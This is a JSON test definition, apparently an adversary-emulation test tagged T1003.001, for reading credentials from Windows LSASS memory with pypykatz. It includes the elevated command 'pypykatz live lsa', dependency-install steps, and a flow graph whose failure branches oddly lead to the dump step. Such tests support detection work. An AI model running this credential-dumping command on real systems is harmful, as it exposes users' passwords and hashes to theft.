{
  "id": "c37bc535-5c62-4195-9cc3-0517673171d8",
  "name": "LSASS read with pypykatz",
  "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35",
      "type": "execute-command",
      "data": {
        "command": "pypykatz live lsa",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "ed67f43a-c3ef-4b19-ac9e-1fea9bd9da14",
      "name": "Check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "1cdfe1d6-81cb-47d8-849e-b1caf76b84fb",
      "name": "Resolve dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"Python 3 must be installed manually\"",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "aebfb7d5-c17a-49ed-899f-eff43b43535d",
      "name": "Re-check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "547d6cea-624d-4e7c-8441-0c61798b4bb0",
      "name": "Check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "15d839fb-7b1e-4031-8926-2264b67a61ad",
      "name": "Resolve dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"PIP must be installed manually\"",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "0f3a364d-de3c-4ca6-bc6a-186bfd6cb925",
      "name": "Re-check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "3c23c38e-405b-4024-9465-210e507b6fe7",
      "name": "Check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "400cc1b8-ebdb-472b-8b7b-6c5b7bcaa42f",
      "name": "Resolve dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pip install pypykatz",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "cde34036-740a-46c6-b925-9a8935efce25",
      "name": "Re-check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "ed67f43a-c3ef-4b19-ac9e-1fea9bd9da14",
      "p": "on-success",
      "o": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35"
    },
    {
      "s": "ed67f43a-c3ef-4b19-ac9e-1fea9bd9da14",
      "p": "on-failure",
      "o": "1cdfe1d6-81cb-47d8-849e-b1caf76b84fb"
    },
    {
      "s": "1cdfe1d6-81cb-47d8-849e-b1caf76b84fb",
      "p": "on-success",
      "o": "aebfb7d5-c17a-49ed-899f-eff43b43535d"
    },
    {
      "s": "aebfb7d5-c17a-49ed-899f-eff43b43535d",
      "p": "on-failure",
      "o": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35"
    },
    {
      "s": "547d6cea-624d-4e7c-8441-0c61798b4bb0",
      "p": "on-success",
      "o": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35"
    },
    {
      "s": "547d6cea-624d-4e7c-8441-0c61798b4bb0",
      "p": "on-failure",
      "o": "15d839fb-7b1e-4031-8926-2264b67a61ad"
    },
    {
      "s": "15d839fb-7b1e-4031-8926-2264b67a61ad",
      "p": "on-success",
      "o": "0f3a364d-de3c-4ca6-bc6a-186bfd6cb925"
    },
    {
      "s": "0f3a364d-de3c-4ca6-bc6a-186bfd6cb925",
      "p": "on-failure",
      "o": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35"
    },
    {
      "s": "3c23c38e-405b-4024-9465-210e507b6fe7",
      "p": "on-success",
      "o": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35"
    },
    {
      "s": "3c23c38e-405b-4024-9465-210e507b6fe7",
      "p": "on-failure",
      "o": "400cc1b8-ebdb-472b-8b7b-6c5b7bcaa42f"
    },
    {
      "s": "400cc1b8-ebdb-472b-8b7b-6c5b7bcaa42f",
      "p": "on-success",
      "o": "cde34036-740a-46c6-b925-9a8935efce25"
    },
    {
      "s": "cde34036-740a-46c6-b925-9a8935efce25",
      "p": "on-failure",
      "o": "9da9acbf-1cd8-40cf-a3b5-94ddbf4fea35"
    }
  ],
  "tags": [
    "T1003",
    "T1003.001"
  ],
  "input_arguments": null
}